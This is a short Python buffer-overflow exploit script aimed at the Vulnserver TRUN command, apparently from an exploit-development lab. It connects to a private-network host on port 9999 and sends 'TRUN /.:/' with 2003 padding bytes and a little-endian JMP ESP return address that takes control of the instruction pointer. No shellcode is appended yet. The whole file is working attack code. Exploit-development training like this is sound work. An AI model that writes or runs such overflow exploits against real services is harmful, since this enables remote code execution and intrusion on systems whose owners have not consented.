#!/usr/bin/python3
import sys
import socket 

HOST='192.168.203.149'
PORT=9999

#jump esp = 625011af -> reverse = \af\11\50\62 "little endian"
shellCode = b"A"*2003 + b"\xaf\x11\x50\x62"
try:
                
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    
    message = b'TRUN /.:/' + shellCode
    client.send((message))
    
    #response = client.recv(1024)
    #print(response.decode('utf-8'))
    client.close()
        
    print(f'Send success!!')

except Exception as e:
    print(e)
    print(f'fail')

